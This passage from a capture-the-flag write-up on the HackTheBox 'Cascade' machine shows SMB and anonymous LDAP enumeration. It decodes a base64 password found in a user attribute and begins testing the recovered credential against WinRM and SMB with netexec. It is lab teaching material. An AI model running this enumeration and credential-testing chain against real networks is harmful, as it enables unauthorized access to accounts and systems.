</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>group:<span class="o">[</span>DnsUpdateProxy<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x44f<span class="o">]</span>
</span></code></pre></div><br />
hm, the interesting group here might be Group Policy Creator Owners, lets try SMB.</p>
<h3 id="smb-enumeration-port-139445">SMB enumeration (port 139/445)</h3>
<h4 id="enum4linux">enum4linux</h4>
<p>we can find more info via rpc, automatically via <code>enum4linux</code>:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="w"> </span>enum4linux<span class="w"> </span>-a<span class="w"> </span><span class="m">10</span>.10.10.182
</span></code></pre></div><br />
for example<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Password<span class="w"> </span>Info<span class="w"> </span><span class="k">for</span><span class="w"> </span>Domain:<span class="w"> </span>CASCADE
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">        </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Minimum<span class="w"> </span>password<span class="w"> </span>length:<span class="w"> </span><span class="m">5</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">        </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Password<span class="w"> </span><span class="nb">history</span><span class="w"> </span>length:<span class="w"> </span>None
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="w">        </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Maximum<span class="w"> </span>password<span class="w"> </span>age:<span class="w"> </span>Not<span class="w"> </span>Set
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="w">        </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Password<span class="w"> </span>Complexity<span class="w"> </span>Flags:<span class="w"> </span><span class="m">000000</span>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="w">                </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>Refuse<span class="w"> </span>Password<span class="w"> </span>Change:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">                </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>Password<span class="w"> </span>Store<span class="w"> </span>Cleartext:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="w">                </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>Password<span class="w"> </span>Lockout<span class="w"> </span>Admins:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="w">                </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>Password<span class="w"> </span>No<span class="w"> </span>Clear<span class="w"> </span>Change:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="w">                </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>Password<span class="w"> </span>No<span class="w"> </span>Anon<span class="w"> </span>Change:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="w">                </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>Password<span class="w"> </span>Complex:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="w">        </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Minimum<span class="w"> </span>password<span class="w"> </span>age:<span class="w"> </span>None
</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="w">        </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Reset<span class="w"> </span>Account<span class="w"> </span>Lockout<span class="w"> </span>Counter:<span class="w"> </span><span class="m">30</span><span class="w"> </span>minutes<span class="w"> </span>
</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="w">        </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Locked<span class="w"> </span>Account<span class="w"> </span>Duration:<span class="w"> </span><span class="m">30</span><span class="w"> </span>minutes<span class="w"> </span>
</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="w">        </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Account<span class="w"> </span>Lockout<span class="w"> </span>Threshold:<span class="w"> </span>None
</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="w">        </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Forced<span class="w"> </span>Log<span class="w"> </span>off<span class="w"> </span>Time:<span class="w"> </span>Not<span class="w"> </span>Set
</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a>
</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="o">[</span>+<span class="o">]</span><span class="w">  </span>Getting<span class="w"> </span><span class="nb">local</span><span class="w"> </span>group<span class="w"> </span>memberships:<span class="w">            </span>
</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a>Group:<span class="w"> </span>Denied<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="s1">&#39; (RID: 572) has member: CASCADE\krbtgt    </span>
</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a><span class="s1">Group: Denied RODC Password Replication Group&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">572</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Controllers
</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a>Group:<span class="w"> </span>Denied<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="s1">&#39; (RID: 572) has member: CASCADE\Schema Admins</span>
</span><span id="__span-11-22"><a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a><span class="s1">Group: Denied RODC Password Replication Group&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">572</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\E</span>nterprise<span class="w"> </span>Admins
</span><span id="__span-11-23"><a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a>Group:<span class="w"> </span>Denied<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="s1">&#39; (RID: 572) has member: CASCADE\Cert Publishers</span>
</span><span id="__span-11-24"><a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a><span class="s1">Group: Denied RODC Password Replication Group&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">572</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Admins
</span><span id="__span-11-25"><a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a>Group:<span class="w"> </span>Denied<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="s1">&#39; (RID: 572) has member: CASCADE\Group Policy Creator Owners</span>
</span><span id="__span-11-26"><a id="__codelineno-11-26" name="__codelineno-11-26" href="#__codelineno-11-26"></a><span class="s1">Group: Denied RODC Password Replication Group&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">572</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\R</span>ead-only<span class="w"> </span>Domain<span class="w"> </span>Controllers
</span><span id="__span-11-27"><a id="__codelineno-11-27" name="__codelineno-11-27" href="#__codelineno-11-27"></a>Group:<span class="w"> </span>HR<span class="s1">&#39; (RID: 1115) has member: CASCADE\s.hickson</span>
</span><span id="__span-11-28"><a id="__codelineno-11-28" name="__codelineno-11-28" href="#__codelineno-11-28"></a><span class="s1">Group: Data Share&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">1138</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Users
</span><span id="__span-11-29"><a id="__codelineno-11-29" name="__codelineno-11-29" href="#__codelineno-11-29"></a>Group:<span class="w"> </span>Audit<span class="w"> </span>Share<span class="s1">&#39; (RID: 1137) has member: CASCADE\s.smith</span>
</span><span id="__span-11-30"><a id="__codelineno-11-30" name="__codelineno-11-30" href="#__codelineno-11-30"></a><span class="s1">Group: Remote Management Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">1126</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\a</span>rksvc
</span><span id="__span-11-31"><a id="__codelineno-11-31" name="__codelineno-11-31" href="#__codelineno-11-31"></a>Group:<span class="w"> </span>Remote<span class="w"> </span>Management<span class="w"> </span>Users<span class="s1">&#39; (RID: 1126) has member: CASCADE\s.smith</span>
</span><span id="__span-11-32"><a id="__codelineno-11-32" name="__codelineno-11-32" href="#__codelineno-11-32"></a><span class="s1">Group: AD Recycle Bin&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">1119</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\a</span>rksvc
</span><span id="__span-11-33"><a id="__codelineno-11-33" name="__codelineno-11-33" href="#__codelineno-11-33"></a>Group:<span class="w"> </span>IT<span class="s1">&#39; (RID: 1113) has member: CASCADE\arksvc</span>
</span><span id="__span-11-34"><a id="__codelineno-11-34" name="__codelineno-11-34" href="#__codelineno-11-34"></a><span class="s1">Group: IT&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">1113</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\s</span>.smith
</span><span id="__span-11-35"><a id="__codelineno-11-35" name="__codelineno-11-35" href="#__codelineno-11-35"></a>Group:<span class="w"> </span>IT<span class="s1">&#39; (RID: 1113) has member: CASCADE\r.thompson</span>
</span><span id="__span-11-36"><a id="__codelineno-11-36" name="__codelineno-11-36" href="#__codelineno-11-36"></a>
</span><span id="__span-11-37"><a id="__codelineno-11-37" name="__codelineno-11-37" href="#__codelineno-11-37"></a><span class="s1">[+]  Getting domain group memberships:        </span>
</span><span id="__span-11-38"><a id="__codelineno-11-38" name="__codelineno-11-38" href="#__codelineno-11-38"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Guests<span class="s1">&#39; (RID: 514) has member: CASCADE\CascGuest</span>
</span><span id="__span-11-39"><a id="__codelineno-11-39" name="__codelineno-11-39" href="#__codelineno-11-39"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\administrator</span>
</span><span id="__span-11-40"><a id="__codelineno-11-40" name="__codelineno-11-40" href="#__codelineno-11-40"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\krbtgt</span>
</span><span id="__span-11-41"><a id="__codelineno-11-41" name="__codelineno-11-41" href="#__codelineno-11-41"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\arksvc</span>
</span><span id="__span-11-42"><a id="__codelineno-11-42" name="__codelineno-11-42" href="#__codelineno-11-42"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\s.smith</span>
</span><span id="__span-11-43"><a id="__codelineno-11-43" name="__codelineno-11-43" href="#__codelineno-11-43"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\r.thompson</span>
</span><span id="__span-11-44"><a id="__codelineno-11-44" name="__codelineno-11-44" href="#__codelineno-11-44"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\util</span>
</span><span id="__span-11-45"><a id="__codelineno-11-45" name="__codelineno-11-45" href="#__codelineno-11-45"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\j.wakefield</span>
</span><span id="__span-11-46"><a id="__codelineno-11-46" name="__codelineno-11-46" href="#__codelineno-11-46"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\s.hickson</span>
</span><span id="__span-11-47"><a id="__codelineno-11-47" name="__codelineno-11-47" href="#__codelineno-11-47"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\j.goodhand</span>
</span><span id="__span-11-48"><a id="__codelineno-11-48" name="__codelineno-11-48" href="#__codelineno-11-48"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\a.turnbull</span>
</span><span id="__span-11-49"><a id="__codelineno-11-49" name="__codelineno-11-49" href="#__codelineno-11-49"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\e.crowe</span>
</span><span id="__span-11-50"><a id="__codelineno-11-50" name="__codelineno-11-50" href="#__codelineno-11-50"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\b.hanson</span>
</span><span id="__span-11-51"><a id="__codelineno-11-51" name="__codelineno-11-51" href="#__codelineno-11-51"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\d.burman</span>
</span><span id="__span-11-52"><a id="__codelineno-11-52" name="__codelineno-11-52" href="#__codelineno-11-52"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\BackupSvc</span>
</span><span id="__span-11-53"><a id="__codelineno-11-53" name="__codelineno-11-53" href="#__codelineno-11-53"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\j.allen</span>
</span><span id="__span-11-54"><a id="__codelineno-11-54" name="__codelineno-11-54" href="#__codelineno-11-54"></a><span class="s1">Group: &#39;</span>Domain<span class="w"> </span>Users<span class="s1">&#39; (RID: 513) has member: CASCADE\i.croft</span>
</span><span id="__span-11-55"><a id="__codelineno-11-55" name="__codelineno-11-55" href="#__codelineno-11-55"></a><span class="s1">Group: &#39;</span>Group<span class="w"> </span>Policy<span class="w"> </span>Creator<span class="w"> </span>Owners<span class="err">&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">520</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\a</span>dministrator
</span></code></pre></div></p>
<h4 id="via-anonymous-logon">via anonymous logon</h4>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>smbclient<span class="w"> </span>-N<span class="w"> </span>-L<span class="w"> </span>cascade.htb
</span></code></pre></div><br />
even though anonymous login was succesful, no shares were found:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Anonymous<span class="w"> </span>login<span class="w"> </span>successful
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Sharename<span class="w">       </span>Type<span class="w">      </span>Comment
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>---------<span class="w">       </span>----<span class="w">      </span>-------
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>Reconnecting<span class="w"> </span>with<span class="w"> </span>SMB1<span class="w"> </span><span class="k">for</span><span class="w"> </span>workgroup<span class="w"> </span>listing.
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>do_connect:<span class="w"> </span>Connection<span class="w"> </span>to<span class="w"> </span>cascade.htb<span class="w"> </span>failed<span class="w"> </span><span class="o">(</span>Error<span class="w"> </span>NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>Unable<span class="w"> </span>to<span class="w"> </span>connect<span class="w"> </span>with<span class="w"> </span>SMB1<span class="w"> </span>--<span class="w"> </span>no<span class="w"> </span>workgroup<span class="w"> </span>available
</span></code></pre></div><br />
since we have no creds, we cant move forward with smb, we could try other services like ldap.</p>
<h3 id="ldap-enumeration">LDAP enumeration</h3>
<p>get naming context<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://cascade.htb<span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span>namingcontexts<span class="w"> </span>
</span></code></pre></div></p>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>dn:
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>namingContexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>namingContexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span></code></pre></div><br />
here the naming context is <code>DC=cascade,DC=local</code></p>
<h5 id="gather-all-users-optional">Gather all users (optional)</h5>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://cascade.htb<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=cascade,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;objectclass=user&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>egrep<span class="w"> </span>-i<span class="w"> </span>^samaccountname<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;: &#39;</span><span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>users.txt
</span></code></pre></div><br />
users.txt:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>CascGuest
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>CASC-DC1$
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>arksvc
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>s.smith
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>r.thompson
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>util
</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>j.wakefield
</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>s.hickson
</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>j.goodhand
</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>a.turnbull
</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>e.crowe
</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>b.hanson
</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>d.burman
</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>BackupSvc
</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>j.allen
</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>i.croft
</span></code></pre></div></p>
<h5 id="check-if-anonymous-login-is-allowed">check if anonymous login is allowed</h5>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://cascade.htb<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=cascade,DC=local&quot;</span>
</span></code></pre></div><br />
i got a full list of users objects etc, so that means that <strong>anonymous bind is enabled</strong></p>
<p>by inspecting the output, i noticed that user <code>r.thompson</code> has this field and value:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>cascadeLegacyPwd:<span class="w"> </span><span class="nv">clk0bjVldmE</span><span class="o">=</span>
</span></code></pre></div><br />
which in base64 is:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;clk0bjVldmE=&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
</span></code></pre></div><br />
so now it seems we have a password for user <code>r.thompson</code><br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>rY4n5eva
</span></code></pre></div></p>
<p>For future reference, keep in mind to check for fields that contain <code>pwd</code> as substring in their name , like the one above (cascadeLegacyPwd) inside the output of <code>ldapsearch</code>.</p>
<p>The gathered creds here was:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>r.thompson
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>rY4n5eva
</span></code></pre></div></p>
<hr />
<h1 id="foothold">Foothold</h1>
<h4 id="checking-access-to-services">Checking access to services</h4>
<p>lets now try to check to which service's we can connect with those creds, using my automated nxc script<br />
https://github.com/ch3ckkm8/auto_netexec<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>./auto_netexec_bulk_creds_checker.sh<span class="w"> </span>cascade.htb<span class="w"> </span><span class="s1">&#39;r.thompson&#39;</span><span class="w"> </span><span class="s1">&#39;rY4n5eva&#39;</span>
</span></code></pre></div></p>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>winrm<span class="w"> </span>port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>winrm<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>WINRM<span class="w">       </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">5985</span><span class="w">   </span>CASC-DC1<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>Build<span class="w"> </span><span class="m">7601</span><span class="w"> </span><span class="o">(</span>name:CASC-DC1<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:cascade.local<span class="o">)</span>
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>WINRM<span class="w">       </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">5985</span><span class="w">   </span>CASC-DC1<span class="w">         </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>cascade.local<span class="se">\r</span>.thompson:rY4n5eva
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>smb<span class="w"> </span>port<span class="w"> </span><span class="m">445</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">445</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>smb<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">445</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>Build<span class="w"> </span><span class="m">7601</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:CASC-DC1<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:cascade.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
